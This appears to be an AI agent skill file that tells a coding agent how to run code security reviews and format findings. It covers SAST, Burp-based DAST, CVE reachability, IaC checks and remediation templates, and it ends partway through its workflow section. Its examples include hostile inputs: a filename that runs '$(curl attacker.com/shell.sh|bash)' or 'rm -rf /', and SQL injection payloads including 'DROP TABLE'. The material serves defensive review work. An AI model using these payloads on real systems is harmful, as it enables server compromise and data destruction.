---
name: ai-security-reviewer
description: >-
  Agent-native SAST+DAST+CVE+IaC: full vulnerability taxonomy (injection, XSS, auth,
  crypto, file, API, SSRF, session, IaC, framework-specific). Graphify, AI validation,
  109-check Appendix E + Appendix H taxonomy attestation. Agent runs rg/graphify/npm audit — no scan scripts.
---

# AI Security Reviewer

**Version 4.3** — Full Vulnerability Taxonomy | Agent-Only Execution | Mandatory Remediation | curl DAST Fallback | 109-Check + Appendix H

## Execution model (read first)

**You are the scanner.** This skill gives **directions only** — you execute every check with `graphify`, `rg`, `Read`, `npm audit`, and Burp MCP. **Do not run skill scan scripts** (`run_sast_scan.sh`, `run_cve_iac_scan.sh`, `discover_burp_hosts.sh`, `generate_coverage_appendix.py`). See **`references/agent-execution.md`**.

| Layer | Who runs it | What it does |
|-------|-------------|--------------|
| **CVE** | **This agent (you)** | `npm audit` + your `rg` imports + `graphify path` → **CVE-NNN** only if exploitable |
| **IaC** | **This agent (you)** | `rg` per `iac-misconfig-scan.md` + Read → **IAC-NNN** |
| **ARCH** | **This agent (you)** | Threat model, trust boundaries, STRIDE → **Appendix G** |
| **SAST** | **This agent (you)** | `graphify query/path` → `rg` per manifest → narrow `Read` → **your** AI validation |
| **DAST** | **This agent (you)** | Burp MCP `send_http1_request`; **curl fallback** if MCP unavailable (`curl-dast-fallback.md`) |
| **Report** | **This agent (you)** | Write `security_report.md` then run `generate_html_report.py` for `security_report.html` |

### Do NOT use scan scripts or subagents

- **No skill scripts for analysis** — run manifest `rg` / `graphify` / `npm audit` commands yourself (`references/agent-execution.md`).
- **No subagents** — `Task` / `explore` / `generalPurpose` break reachability context.

Reasons:
- Security findings need one continuous context (source → sink → validation → PoC).
- Subagents cannot reliably complete Appendix E/F coverage matrices.
- Scripts hide reachability decisions the AI must make per hit.

### Do NOT require Semgrep

Semgrep is **not** part of this skill. It was listed in v3.5 only as an optional CI companion — **remove it from your workflow**.

Your analysis stack (**you run each step** — manifests are cookbooks, not scripts):

0. **`references/manual-code-review.md`** — senior manual review: context, taint analysis, pre-report gates (G1–G5)
1. **`references/agent-execution.md`** — agent-only rules (read first)
2. **`references/sast_scan_manifest.md`** — run each section's `rg` yourself → SAST-OG-01…28
3. **`references/frontend-stacktrace-leaks.md`** — SAST-LEAK-01…08
4. **`references/secrets-patterns.md`** — SAST-SECRET-01…11
5. **`references/injection-deep-scan.md`** — SAST-INJ-* + extended injection (NoSQL, CRLF, SSTI, EL, log)
6. **`references/extended-category-scans.md`** — supplemental `rg` for taxonomy **Partial** rows
7. **`references/vulnerability-taxonomy-coverage.md`** — master map of all issue classes → checks
8. **`references/cve-exploitability.md`** — CVE-DEPS/REACH/CODE + your reachability proof
9. **`references/iac-misconfig-scan.md`** — IAC-* `rg` on infra/Docker/K8s/TF/Nginx/CI
10. **`references/security-architect.md`** — ARCH-* → Appendix G
11. **`references/report-coverage-matrix.md`** — all **109** Appendix E rows you must complete
12. **`graphify path "<source>" "<sink>"`** — mandatory for injection, CVE, SSRF reachability
13. **AI validation checklist + pre-report gates (G1–G5)** — true positives only
14. **`references/report-finding-completeness.md`** — every finding must have **`### Remediation`** (BEFORE/AFTER for code)

**Burp MCP host rule (mandatory):**
1. Discover hosts with `rg` per **`references/burp-host-discovery.md`** (do **not** run `discover_burp_hosts.sh`)
2. **Never probe `localhost` / `127.0.0.1`**
3. If no external host in code → **skip Burp** → `Not Verified (no target host in code)`

**Never run OpenGrep/Semgrep CLI** as part of this skill. We only borrow issue **names** from [opengrep/opengrep-rules](https://github.com/opengrep/opengrep-rules).

---

## Senior Manual Code Review Methodology (MANDATORY)

**Role:** Senior Application Security Engineer. **Objective:** Report only **realistic, exploitable** issues with **high confidence** — minimize false positives and speculative findings.

Full methodology: **`references/manual-code-review.md`**. This layers on top of all existing phases, manifests, and 109 checks — **nothing below is removed**.

### Three pillars (execute in order)

| Pillar | When | What |
|--------|------|------|
| **1. Application context** | Phase −1 (before or with first graphify query) | Language, framework, architecture, entry points, trust boundaries, auth mechanisms, user-controlled inputs, sensitive assets (tokens, PII, payment, admin) |
| **2. Taint / data-flow analysis** | Phase 2 + every manifest hit | Trace user input **source → processing → sink** across functions, files, services, APIs, DB; document validation, sanitization, encoding, authorization |
| **3. Pre-report verification gates** | Phase 3 (mandatory before any FINDING) | All five gates must PASS for TRUE POSITIVE |

### Pre-report verification gates (mandatory)

Before assigning **VULN-NNN**, **AUTH-NNN**, **CVE-NNN**, or **IAC-NNN**:

| Gate | Verify |
|------|--------|
| **G1** | Is there an actual **attacker-controlled** input (or missing auth on reachable HTTP route)? |
| **G2** | Can input **realistically reach** the dangerous sink (or unauthenticated handler run)? — `graphify path` required |
| **G3** | Is there **existing protection** that blocks exploitation? — if effective → Appendix A, not FINDING |
| **G4** | Can it be **practically exploited** (not theoretical, dev-only, or test-only)? |
| **G5** | What **assumptions** are required? — list explicitly; many unlikely assumptions → exclude or downgrade |

**Default:** When in doubt, **do not report**. Filter failures → **Appendix A** with failed gate noted.

### Manual review taxonomy (in addition to manifests)

Review against: **OWASP Top 10**, **OWASP API Top 10**, and the full taxonomy in **`vulnerability-taxonomy-coverage.md`** (injection, XSS, auth/authz, crypto, sensitive data, path/file, deserialization, API, SSRF, XML, session, config, concurrency, mobile, IaC, supply chain, framework-specific). See **`manual-code-review.md`** for checklist mapped to skill phases.

---

## Purpose

Enterprise security reviewer — **agent-native analysis** with Checkmarx-quality output:

0. **Senior Manual Review Lens** — Context-first, taint analysis, pre-report gates G1–G5; high-confidence findings only
1. **Graphify Discovery** — Knowledge-graph queries before broad file reads (saves tokens)
2. **Unauthenticated Endpoint Audit** — Route auth inventory; Medium if code-only, High if Burp MCP confirms
3. **Static Analysis** — 750+ pattern signatures across 85+ vulnerability classes
4. **AI Validation** — LLM-powered true positive verification
5. **Natural Language Descriptions** — Checkmarx-style vulnerability explanations
6. **Full Stack Traces** — Complete data flow from source to sink
7. **Detailed Remediation** — Code fixes with before/after examples
8. **Burp Suite PoC Requests** — Copy-paste HTTP requests for Repeater/Intruder per finding
9. **Burp MCP Live Verification** — `send_http1_request` confirms missing auth when MCP available
10. **HTML Report Export** — Styled HTML report generated at end of every review
11. **PDF Export** — Optional PDF from markdown (legacy)
12. **Full Check Coverage Matrix** — Appendix E lists all **109** checks; Appendix F phase log; Appendix G architecture assessment
13. **Exploitable CVE Analysis** — Dependency CVEs reported only with import + path reachability proof
14. **IaC Misconfiguration Detection** — Docker, Kubernetes, Terraform, Nginx, CI/CD security review
15. **Security Architect Lens** — Attack surface, trust boundaries, STRIDE, control maturity

---

## Graphify Integration (MANDATORY — Token Optimization)

> **Do not** read whole files or run repo-wide Grep until Graphify has oriented you — unless `graphify-out/graph.json` is missing. **Do not spawn subagents** — you run the review directly in this session.

### LLM backend policy (native AI — no Ollama)

| Layer | Who runs it | Backend |
|-------|-------------|---------|
| **Security analysis** | **This agent (you)** | **Cursor native AI** — SAST, validation, reachability, report |
| **Graph semantic (docs/images)** | `/graphify .` in Cursor | **Cursor native AI** via graphify skill subagents |
| **Graph AST (code)** | `graphify extract` / `graphify update` | **Local tree-sitter only** — no LLM |

**Do NOT use Ollama** (`--backend ollama`, `OLLAMA_BASE_URL`) in this skill. Ollama is slow, often truncates context, and duplicates work the Cursor agent already does better.

**Build `graphify-out/graph.json` (pick one):**

1. **Preferred (native AI):** `/graphify .` — semantic extraction uses the IDE session model, not Ollama.
2. **AST-only (headless, no LLM):** scope to **source directories only** (excludes `Assets/`, images, unrelated docs):
   ```bash
   unset OLLAMA_BASE_URL
   graphify extract src api lib --no-cluster   # your code roots, not repo root
   ```
   Code-only corpora need **no API key**. AST edges are enough for `graphify query` / `graphify path`.
3. **After code changes:** `graphify update .` (AST-only, no LLM).

If `graphify extract .` (repo root) pulls in images/docs and tries Ollama, **stop** — re-run scoped to code dirs or use `/graphify .`.

### Prerequisites

| Requirement | Check | Install |
|-------------|-------|---------|
| Graphify CLI | `graphify --version` | `pipx install graphifyy` |
| Project graph | `test -f graphify-out/graph.json` | `/graphify .` (native AI) or scoped `graphify extract <src-dirs> --no-cluster` |
| Burp MCP (optional) | MCP tool `send_http1_request` on `user-burp` | Burp Suite + MCP extension; Cursor MCP config |
| Cursor rule (optional) | `.cursor/rules/graphify.mdc` | `graphify cursor install` |

### Graphify-first workflow (use instead of blind exploration)

| Step | Command | Replaces |
|------|---------|----------|
| Map attack surface | `graphify query "API routes auth handlers user input" --budget 1500` | Glob + Read many controllers |
| Find vuln hotspots | `graphify query "SQL exec shell render template deserialize" --budget 1500` | Repo-wide Grep |
| Trace source→sink | `graphify path "<source>" "<sink>"` | Manual multi-file Read chain |
| Inspect symbol | `graphify explain "<Class.method>"` | Read entire class file |
| Impact analysis | `graphify affected "<sink>" --depth 2` | Reverse grep |
| Confirm lines only | `Read` 10–30 lines at graphify-identified file:line | Read full files |

Always pass `--budget N` on `query` (1200–2000 per query). Batch related questions into one query instead of many small reads.

### Security review sequence (agent executes each step)

```
−1. Application context      → manual-code-review.md Phase −1 → Appendix G inputs
0. Host discovery            → rg per burp-host-discovery.md (no scripts)
1. graphify query            → attack surface (2–3 queries, budget 1500 each)
2. SAST manifests            → you run rg per sast_scan_manifest + LEAK + SECRET + INJ
2b. Extended taxonomy scans   → extended-category-scans.md (Partial rows) → Appendix H
3. CVE analysis              → npm audit + cve-exploitability.md + graphify path
4. IaC scan                  → rg per iac-misconfig-scan.md + Read
5. Architect review          → security-architect.md → Appendix G
6. Route auth audit          → route_auth_audit.md → AUTH-NNN
7. Burp verify               → hosts from step 0 only (never localhost)
7b. curl verify              → if Burp MCP unavailable: curl-dast-fallback.md (same verdict matrix)
8. graphify path             → per candidate: source → sink (reachability)
9. Read + AI validate        → Phase 3 checklist + pre-report gates G1–G5
10. Burp PoC                 → TRUE POSITIVE + AUTH (code-derived host)
11. security_report.md       → Appendix D + E + F + G + H; **every finding has ### Remediation**
12. HTML (mandatory)         → generate_html_report.py → security_report.html
```

### Query templates

Load **`references/graphify_security.md`** for copy-paste queries by vulnerability class (SQLi, XSS, SSRF, secrets, etc.).

Load **`references/burp_poc_templates.md`** for copy-paste Burp Repeater templates by vulnerability class.

Load **`references/route_auth_audit.md`** for unauthenticated endpoint detection, severity rules, and Burp MCP verification.

### Fallback (no graph)

If `graphify-out/graph.json` does not exist:

1. Ask user to run `/graphify .` (native AI semantic) **or** build AST graph yourself:
   `unset OLLAMA_BASE_URL && graphify extract <src-dirs> --no-cluster` (code dirs only — **not** repo root if images/docs trigger Ollama)
2. If declined, proceed with targeted Grep using `references/patterns.md` — **never** read entire codebase
3. **Never** fall back to `--backend ollama` or wait on local Ollama extraction

---

## Vulnerability Description Format (MANDATORY)

### Natural Language Description Template

Every vulnerability MUST have a description following this Checkmarx-style format:

```
The method [METHOD_NAME] [VULNERABILITY_ACTION] at line [LINE] of [FILE_PATH]. 
[EXPLANATION_OF_FLOW]. This [TAINTED_DATA_DESCRIPTION] is [HOW_IT_REACHES_SINK] 
without [MISSING_PROTECTION], enabling an attacker to [ATTACK_IMPACT].
```

### Examples of Proper Descriptions

#### XSS Example
```
The method renderAnswerChunkText embeds untrusted data in generated output with 
dangerouslySetInnerHTML, at line 2042 of src/components/OpenAI/index.js. This 
untrusted data originates from the user-controlled 'answer' parameter passed through 
the processResponse function at line 1985. The data flows through formatText (line 2010) 
and sanitizeBasic (line 2025) before reaching the sink. However, sanitizeBasic only 
removes script tags and does not prevent event handler injection. This tainted data 
is embedded into the output without proper contextual encoding, enabling an attacker 
to inject malicious JavaScript code that executes in victims' browsers, potentially 
stealing session tokens, performing actions on behalf of users, or defacing the page.
```

#### SQL Injection Example
```
The method getUserById constructs a SQL query using string concatenation with the 
user-supplied 'userId' parameter, at line 156 of src/api/controllers/UserController.java. 
The userId originates from the HTTP request parameter at line 142 in the getUser endpoint. 
This untrusted data flows through the validateInput method (line 148) which only checks 
for null values but does not sanitize SQL metacharacters. The tainted data is then 
concatenated directly into the SQL query string at line 156 and executed via 
statement.executeQuery() at line 158. This enables an attacker to inject arbitrary 
SQL commands to bypass authentication, extract sensitive data from other tables, 
modify or delete database records, or potentially execute operating system commands 
on the database server.
```

#### Command Injection Example
```
The method processUpload passes user-controlled filename to a shell command via 
os.system(), at line 89 of src/utils/file_handler.py. The filename originates from 
the multipart form data parsed at line 72 in the upload_file endpoint. This untrusted 
data is stored in the 'original_filename' variable at line 75 and passed to 
sanitize_filename (line 78) which only removes path separators but allows shell 
metacharacters. The tainted filename is then interpolated into the shell command 
f"convert {filename} -resize 800x600 {output_path}" at line 89 without proper 
escaping, enabling an attacker to inject arbitrary shell commands by crafting a 
malicious filename such as "; rm -rf / #" or "$(curl attacker.com/shell.sh|bash)", 
leading to complete server compromise.
```

---

## Stack Trace / Data Flow Format (MANDATORY)

Every finding MUST include a complete stack trace showing the data flow:

```markdown
### Data Flow Trace (Source → Sink)

┌─────────────────────────────────────────────────────────────────────────────────┐
│ TAINT PROPAGATION PATH                                                          │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌─ SOURCE ──────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     142                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     String userId = request.getParameter("id");                     │  │
│  │ Type:     HTTP Request Parameter (User-Controlled)                        │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                              │                                                  │
│                              ▼                                                  │
│  ┌─ STEP 1 ──────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     145                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     String validatedId = validateInput(userId);                     │  │
│  │ Analysis: Validation only checks for null, not SQL metacharacters         │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                              │                                                  │
│                              ▼                                                  │
│  ┌─ STEP 2 ──────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     148                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     String query = "SELECT * FROM users WHERE id = '" + validatedId │  │
│  │ Analysis: Tainted data concatenated into SQL string                       │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                              │                                                  │
│                              ▼                                                  │
│  ┌─ SINK ────────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     150                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     ResultSet rs = statement.executeQuery(query);                   │  │
│  │ Type:     SQL Query Execution (Dangerous Operation)                       │  │
│  │ Status:   ⚠️ TAINTED DATA REACHES SINK WITHOUT SANITIZATION               │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

### Simplified Flow
\`\`\`
request.getParameter("id")     [UserController.java:142]  ─┐
                                                           │
    └─► validateInput(userId)  [UserController.java:145]  ─┤ NO SANITIZATION
                                                           │
        └─► query = "SELECT..."+validatedId [line:148]    ─┤ STRING CONCAT
                                                           │
            └─► statement.executeQuery(query) [line:150]  ─┘ SQL EXECUTION
\`\`\`
```

---

## Complete Finding Format

```markdown
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## [CRITICAL] SQL Injection in User Authentication                    [VULN-001]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Classification
| Attribute          | Value                                              |
|--------------------|----------------------------------------------------|
| Vulnerability Type | SQL Injection                                      |
| CWE ID             | CWE-89: Improper Neutralization of Special Elements|
| OWASP Category     | A03:2021 - Injection                              |
| Severity           | Critical                                           |
| CVSS Score         | 9.8 (Critical)                                     |
| Confidence         | High                                               |
| AI Verdict         | ✅ TRUE POSITIVE                                   |

### Location Summary
| Attribute          | Value                                              |
|--------------------|----------------------------------------------------|
| File               | src/api/controllers/UserController.java            |
| Class              | UserController                                     |
| Method             | getUser()                                          |
| Sink Line          | 150                                                |
| Source Line        | 142                                                |
| Best Fix Location  | Line 148 (query construction)                      |

### Description

The method **getUser** constructs a SQL query using string concatenation with the 
user-supplied **userId** parameter, at line **150** of **src/api/controllers/UserController.java**. 

The userId originates from the HTTP request parameter `request.getParameter("id")` at 
line 142 in the getUser endpoint. This untrusted data flows through the `validateInput` 
method (line 145) which only checks for null values but does not sanitize SQL metacharacters 
like single quotes, semicolons, or comment sequences.

The tainted data is then concatenated directly into the SQL query string:
\`\`\`java
String query = "SELECT * FROM users WHERE id = '" + validatedId + "'";
\`\`\`

This query is executed via `statement.executeQuery(query)` at line 150 without 
parameterization, enabling an attacker to inject arbitrary SQL commands.

### Data Flow Trace

[Full stack trace as shown above]

### Attack Vectors

\`\`\`
# Authentication Bypass
GET /api/users?id=' OR '1'='1' --

# Data Exfiltration  
GET /api/users?id=' UNION SELECT username,password,null FROM admin_users --

# Database Manipulation
GET /api/users?id='; DROP TABLE users; --

# Blind SQL Injection (Time-based)
GET /api/users?id=' AND SLEEP(5) --
\`\`\`

### Burp Suite PoC (MANDATORY for HTTP-exploitable findings)

Provide a **complete raw HTTP request** ready for Burp Repeater. Use placeholders for secrets. Mark Intruder positions with `§payload§`.

\`\`\`http
GET /api/users?id=§1' OR '1'='1'--§ HTTP/1.1
Host: staging.example.com
User-Agent: Mozilla/5.0 (Security-Review)
Accept: application/json
Cookie: session=[SESSION_COOKIE]
\`\`\`

| Field | Value |
|-------|-------|
| **Prerequisites** | Public endpoint OR valid session from `/login` |
| **Auth required** | No / Yes — [describe] |
| **Intruder position** | `id` parameter |
| **Payload list** | `' OR '1'='1'--`, `' UNION SELECT...`, `' AND SLEEP(5)--` |
| **Expected confirmation** | HTTP 200 + extra records / SQL error in body / 5s delay |
| **Destructive** | No — read-only probe |

**Multi-step exploits:** number steps (Step 1 store payload → Step 2 trigger). For non-HTTP findings write: `Burp PoC: N/A — not HTTP-exploitable`.

See **`references/burp_poc_templates.md`** for class-specific templates (SQLi, XSS, SSRF, IDOR, NoSQL, etc.).

### Impact Assessment

| Impact Category    | Level  | Description                                       |
|--------------------|--------|---------------------------------------------------|
| Confidentiality    | HIGH   | Attacker can read any data from the database      |
| Integrity          | HIGH   | Attacker can modify or delete any records         |
| Availability       | HIGH   | Attacker can drop tables or corrupt database      |
| Authentication     | HIGH   | Complete authentication bypass possible           |
| Business Impact    | SEVERE | Data breach, regulatory fines, reputation damage  |

### AI Validation Details

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                    AI VALIDATION CHECKLIST                      │
├─────────────────────────────────────────────────────────────────┤
│ 1. Source Analysis                                              │
│    ├─ Is input user-controlled?           ✅ YES               │
│    ├─ Input type: HTTP GET parameter                           │
│    └─ Can attacker influence value?       ✅ YES               │
│                                                                 │
│ 0. Pre-Report Gates (G1–G5)                                     │
│    ├─ G1 Attacker-controlled input?       ✅ YES               │
│    ├─ G2 Reaches sink realistically?      ✅ YES               │
│    ├─ G3 Protection bypassed?             ✅ YES               │
│    ├─ G4 Practically exploitable?         ✅ YES               │
│    └─ G5 Assumptions minimal?             ✅ YES               │
│                                                                 │
│ 2. Sanitization Check                                           │
│    ├─ Input validation present?           ⚠️ PARTIAL           │
│    ├─ Validation type: Null check only                         │
│    ├─ SQL metacharacters filtered?        ❌ NO                │
│    └─ Parameterized query used?           ❌ NO                │
│                                                                 │
│ 3. Sink Reachability                                            │
│    ├─ Code path accessible?               ✅ YES               │
│    ├─ Authentication required?            ❌ NO (Public API)   │
│    └─ Is this production code?            ✅ YES               │
│                                                                 │
│ 4. Exploitability                                               │
│    ├─ Can payload reach sink intact?      ✅ YES               │
│    ├─ Standard techniques work?           ✅ YES               │
│    └─ Real-world impact?                  ✅ YES (Data breach) │
│                                                                 │
│ ═══════════════════════════════════════════════════════════════ │
│ VERDICT: ✅ TRUE POSITIVE - Confirmed Exploitable               │
│ REASONING: User input reaches SQL execution without             │
│            parameterization or proper sanitization.             │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

### Remediation

#### Recommended Fix: Parameterized Queries (PreparedStatement)

**BEFORE (Vulnerable):**
\`\`\`java
// UserController.java - Lines 142-150
public User getUser(HttpServletRequest request) {
    String userId = request.getParameter("id");              // Line 142 - SOURCE
    String validatedId = validateInput(userId);              // Line 145
    
    // VULNERABLE: String concatenation
    String query = "SELECT * FROM users WHERE id = '" + validatedId + "'";  // Line 148
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);                 // Line 150 - SINK
    // ...
}
\`\`\`

**AFTER (Secure):**
\`\`\`java
// UserController.java - Lines 142-155
public User getUser(HttpServletRequest request) {
    String userId = request.getParameter("id");
    
    // Input validation - type check
    if (userId == null || !userId.matches("^[0-9]+$")) {
        throw new IllegalArgumentException("Invalid user ID format");
    }
    
    // SECURE: Parameterized query prevents SQL injection
    String query = "SELECT * FROM users WHERE id = ?";
    PreparedStatement pstmt = connection.prepareStatement(query);
    pstmt.setString(1, userId);  // Automatically escapes special characters
    ResultSet rs = pstmt.executeQuery();
    // ...
}
\`\`\`

#### Alternative Fix: ORM/JPA

\`\`\`java
// Using Spring Data JPA
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    // Spring Data automatically uses parameterized queries
    Optional<User> findById(Long id);
}

// In controller
public User getUser(@RequestParam Long id) {
    return userRepository.findById(id)
        .orElseThrow(() -> new UserNotFoundException(id));
}
\`\`\`

#### Defense in Depth Recommendations

1. **Input Validation**: Validate userId is numeric before processing
2. **Least Privilege**: Database user should have minimal permissions
3. **WAF Rules**: Deploy SQL injection detection rules
4. **Monitoring**: Log and alert on SQL errors indicating injection attempts

### References

| Resource | Link |
|----------|------|
| CWE-89 | https://cwe.mitre.org/data/definitions/89.html |
| OWASP SQL Injection | https://owasp.org/www-community/attacks/SQL_Injection |
| Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html |
| Java PreparedStatement | https://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html |

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Unauthenticated Endpoint Finding Format (AUTH-NNN)

Use for **missing or weak authentication** on HTTP routes. Separate ID series from `VULN-NNN`. Severity and status **depend on Burp verification**, not only code impact.

### Severity & Status Rules (MANDATORY)

| Condition | Severity | Status |
|-----------|----------|--------|
| Code shows missing auth; **not** live-tested OR Burp MCP absent | **Medium** | **Not Verified** |
| Burp MCP `send_http1_request` without auth → app responds (2xx business body, or 4xx validation without auth challenge) | **High** | **Verified in Burp** |
| Code suggests missing auth; Burp returns 401/403 auth error or login redirect | **Medium** | **Not Verified** (auth at gateway) |
| Burp returns WAF 403 only | **Medium** | **Not Verified** (WAF blocked) |

> Injection/IDOR on the same route may still be a separate `VULN-NNN` at Critical/High — AUTH findings measure **access control**, not payload exploitability.

### AUTH Finding Template

```markdown
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## [HIGH|MEDIUM] Unauthenticated Endpoint — [METHOD] [PATH]              [AUTH-001]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Classification
| Attribute          | Value                                              |
|--------------------|----------------------------------------------------|
| Vulnerability Type | Missing Authentication / Broken Access Control     |
| CWE ID             | CWE-306: Missing Authentication for Critical Function |
| OWASP Category     | A01:2021 - Broken Access Control                  |
| Severity           | High (Verified in Burp) OR Medium (Not Verified)   |
| Status             | Verified in Burp / Not Verified                    |
| Confidence         | High (code) / High (code + live)                   |
| AI Verdict         | ✅ TRUE POSITIVE (missing auth middleware)         |

### Location Summary
| Attribute          | Value                                              |
|--------------------|----------------------------------------------------|
| Router File        | src/routes/api/index.js                            |
| Route Line         | 520                                                |
| Method / Path      | GET /order/details                                 |
| Auth Expected      | verifySsoToken chain                               |
| Auth Present       | None in handler chain                              |
| Bypass Notes       | N/A — or `isSeller=true` skips SSO                 |

### Description

The route **GET /order/details** is registered at line **520** of **src/routes/api/index.js** 
without **verifySsoToken**, **AuthHandler.verifySsoToken**, or **Handler.verifySsoToken** in its 
middleware chain. Any client that can reach this host may invoke order-detail logic without a 
valid SSO session [unless gateway/WAF blocks unauthenticated traffic — see Live Verification].

### Route Handler Chain (code)

\`\`\`javascript
router.get('/order/details', Validator..., Preparer..., Handler..., Responder.respond);
// No verifySsoToken in chain
\`\`\`

### Live Verification (Burp MCP)

| Field | Value |
|-------|-------|
| Burp MCP | Available / Not available |
| Tool | `send_http1_request` (server: `user-burp`) |
| Host | [TARGET_HOST] |
| Auth headers | None (no Cookie, Authorization, SSO) |
| HTTP status | 200 |
| Response indicator | [order_id, passenger name, PII markers] |
| **Status** | **Verified in Burp** |
| **Severity** | **High** |

### Burp Suite PoC

\`\`\`http
GET /api/v1/order/details?order_id=[ORDER_ID] HTTP/1.1
Host: [TARGET_HOST]
User-Agent: Mozilla/5.0 (Security-Review)
Accept: application/json
Connection: close

\`\`\`

### Impact Assessment

| Impact Category    | Level  | Description                                       |
|--------------------|--------|---------------------------------------------------|
| Confidentiality    | HIGH   | Order/PII readable without login                  |
| Integrity          | MEDIUM | Depends on endpoint (read vs state-change)        |
| Authentication     | HIGH   | No SSO required at application layer              |

### Remediation

Add **Preparer.verifySsoToken**, **AuthHandler.verifySsoToken**, **Handler.verifySsoToken** to the 
route chain (match neighboring protected routes). For intentionally public endpoints, document 
in OpenAPI and enforce rate limiting + minimal response schema.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Exploitable CVE Finding Format (CVE-NNN)

Use when a **published CVE** (Critical/High) is **reachable and exploitable** in this codebase — not for unreachable transitive deps.

```markdown
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## [CRITICAL|HIGH] Exploitable CVE — [PACKAGE] [CVE-YYYY-NNNNN]           [CVE-001]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Classification
| Attribute | Value |
|-----------|-------|
| CVE ID | CVE-YYYY-NNNNN |
| CVSS | X.X (Critical/High) |
| Package | name@affected_version |
| Fixed in | name@fixed_version |
| CWE | CWE-XXX |
| AI Verdict | ✅ EXPLOITABLE (reachable) |

### Reachability Proof
| Step | Location | Evidence |
|------|----------|----------|
| Advisory | npm audit / NVD | Critical/High |
| Lockfile | package-lock.json | version X.Y.Z present |
| Import | routes/foo.js:12 | `require('package')` |
| Call site | api/bar.js:89 | vulnerable API invoked |
| User path | GET /api/baz | `graphify path` req → sink |

### Exploit Scenario
[How attacker triggers vulnerable code — 2-4 sentences]

### Remediation
1. Upgrade to `package@fixed_version`
2. `npm ci` / regenerate lockfile
3. Re-run CVE-REACH checks

**Burp PoC:** N/A unless HTTP-triggered — or include HTTP request if applicable.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Downgrade rules:** CVE in lockfile but **no import** → Appendix A (not reachable), Appendix E = PASS.

---

## IaC Misconfiguration Finding Format (IAC-NNN)

```markdown
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## [HIGH|MEDIUM] IaC Misconfiguration — [TITLE]                            [IAC-001]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Classification
| Attribute | Value |
|-----------|-------|
| Type | Docker / Kubernetes / Terraform / Nginx / CI |
| Check ID | IAC-DOCKER-01 (etc.) |
| File | infra/nginx/staging.conf:42 |
| Severity | High |
| Exposure | Internet-facing / internal |
| AI Verdict | ✅ TRUE POSITIVE |

### Description
The [resource] at line **N** of **[file]** [misconfiguration detail]. In production this 
[impact: root container, open SG, missing HSTS, etc.].

### Blast Radius (ARCH-07)
[Can attacker reach secrets, cluster admin, or customer data from this misconfig?]

### Remediation
**BEFORE:** [snippet]
**AFTER:** [secure snippet]

**Burp PoC:** N/A — infrastructure finding (unless HTTP header visible at edge).
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Workflow

### Phase −1: Application Context (mandatory — before broad scanning)

Follow **`references/manual-code-review.md`** Phase −1. Record in working notes and feed **Appendix G**:

1. Determine language, framework, architecture, entry points, trust boundaries, authentication mechanisms.
2. Identify user-controlled inputs and data-flow entry points (HTTP, uploads, WebSocket, callbacks).
3. Identify sensitive assets: tokens, credentials, PII, payment data, admin functionality.
4. Use README, architecture docs, and first `graphify query` — do **not** repo-wide Read before this + Phase 0 orient you.

### Phase 0: Graphify Recon (before any broad file reads)

1. Verify `graphify-out/graph.json` exists; if not, request `/graphify .` (native AI) or run scoped AST extract (`unset OLLAMA_BASE_URL`; code dirs only — see **LLM backend policy**)
2. Run 1–3 scoped queries (see `references/graphify_security.md`):
